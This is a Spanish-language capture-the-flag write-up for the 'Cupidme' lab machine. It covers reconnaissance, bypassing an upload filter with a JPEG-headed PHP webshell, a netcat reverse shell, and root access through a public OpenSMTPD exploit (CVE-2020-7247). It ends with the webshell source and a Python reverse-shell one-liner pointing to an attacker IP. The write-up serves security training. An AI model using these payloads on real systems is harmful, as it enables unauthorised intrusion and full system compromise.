# Cupidme - HACKMEX

**OS**: Linux   
**Dificultad**: Basic   
**Puntos**: 5,550   

## Resumen 
- Unrestricted File Upload 
- OpenSMTPD - Remote Code Execution 

## Nmap Scan

`nmap 10.10.10.205` 

```
xen@xen-env:~/hackmex$ nmap 10.0.30.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 13:25 CDT
Nmap scan report for 10.0.30.187
Host is up (0.17s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.37 seconds
xen@xen-env:~/hackmex$
```
## Enumeracion 

Enumerando el puerto 80 podemos observar dentro del codigo fuente el siguiente mensaje

```
<!--<form action="upload.php" method="post" enctype="multipart/form-data"> Select image to upload:<br/><input type="file" name="image" id="image"><input type="submit" value="Upload Image" name="submit"></form>-->
```

Haciendo un analisis del codigo fuente, vemos que hace un action hacia el archivo upload.php, en donde realiza una subida de archivos. Asi que probemos como reacciona a nuestra solicitud.

## Unrestricted File Upload

1er intento. Subimos un archivo sencillo

`curl -F "image=@file.txt" http://10.0.30.187/upload.php`

```
Array
(
    [0] => Mimetype not allowed, please upload an image/jpeg file.
)
```

2do intento. Subimos un archivo php con cabecera jpeg

`curl -F "image=@xen.php" http://10.0.30.187/upload.php`

```
Success. file uploaded at images/xen.php
```

Una vez subido con exito nuestra webshell, podemos ejecutar comandos remotamente.

`curl http://10.0.30.187/images/xen.php?xen=id`

```
����
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ahora probamos una revershell

`curl "http://10.0.30.187/images/xen.php?xen=nc -e /bin/bash 10.10.0.26 2121"`

De nuestro lado recibiremos la conexion

```
xen@xen-env:~/hackmex$ nc -lvp 2121
listening on [any] 2121 ...
10.0.30.187: inverse host lookup failed: Unknown host
connect to [10.10.0.26] from (UNKNOWN) [10.0.30.187] 56334
```

## OpenSMTPD - Remote Code Execution 

Viendo los servicios locales observamos un puerto muy relevante

```
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
LISTEN    0         128             127.0.0.11:41037            0.0.0.0:*       
LISTEN    0         128                0.0.0.0:80               0.0.0.0:*       
LISTEN    0         5                127.0.0.1:25               0.0.0.0:*       
LISTEN    0         128              127.0.0.1:9001             0.0.0.0:* 
```

Probando los puertos observamos lo siguiente

```
www-data@cupidme:/tmp$ nc 127.0.0.1 25 
nc 127.0.0.1 25 
220 cupidme.echocity-f.com ESMTP OpenSMTPD
```
Tratando de un servicio llamado OpenSMTP, por lo que buscando un exploit publico damos con el siguiente: [CVE-2020-7247](https://www.exploit-db.com/raw/47984)

Ejecutamos el exploit y esperamos conexion reversa
```
www-data@cupidme:/tmp$ python3 xen.py 127.0.0.1 25 "python3 /tmp/reverse.py"
python3 xen.py 127.0.0.1 25 "python3 /tmp/reverse.py"
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
www-data@cupidme:/tmp$ 
```

Pwn!!

```
xen@xen-env:~/hackmex$ nc -lvp 2222
listening on [any] 2222 ...
10.0.30.187: inverse host lookup failed: Unknown host
connect to [10.10.0.26] from (UNKNOWN) [10.0.30.187] 44170
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

## Archivos utilizados 

**xen.php**
```php
����
<?php system($_GET['xen']);?>
```

**reverse.php**
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.26",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

